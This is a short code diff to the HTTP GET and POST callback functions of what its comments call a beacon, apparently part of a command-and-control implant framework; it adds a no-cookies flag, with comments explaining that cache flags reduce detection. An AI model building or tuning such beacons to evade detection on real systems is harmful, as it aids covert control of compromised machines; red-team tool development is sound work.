@@ -41,7 +41,7 @@ bool HTTP_GET(const std::wstring& callback_host, int callback_port, std::wstring
         http_verb.c_str(),   // Method
         uri.c_str(),         // Path
         NULL, NULL, NULL,
-        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, ///reload: always gets new, no cache, doesn't cache. cache = bad cuz the data is somewhere else besides beacon. Increases detection likelyhood + potential repeat commands
+        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_COOKIES, ///reload: always gets new, no cache, doesn't cache. cache = bad cuz the data is somewhere else besides beacon. Increases detection likelyhood + potential repeat commands
         0
     );
     if (!hRequest) {
@@ -50,6 +50,7 @@ bool HTTP_GET(const std::wstring& callback_host, int callback_port, std::wstring
         return false;
     }
 
+    
     // 4. Add Headers Loop
     for (const auto& header : headers) {
         //https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpaddrequestheadersa
@@ -115,7 +116,7 @@ bool HTTP_POST(const std::wstring& callback_host, int callback_port, std::wstrin
         http_verb.c_str(),//L"[[http_post_verb]]",                // Method - template, mallc2 this
         uri.c_str(),//L"[[http_post_uri]]",          // Path - template, mallc2 this
         NULL, NULL, NULL,
-        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, ///reload: always gets new, no cache, doesn't cache. cache = bad cuz the data is somewhere else besides beacon. Increases detection likelyhood + potential repeat commands
+        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_COOKIES, ///reload: always gets new, no cache, doesn't cache. cache = bad cuz the data is somewhere else besides beacon. Increases detection likelyhood + potential repeat commands
         0
     );
     if (!hRequest) {
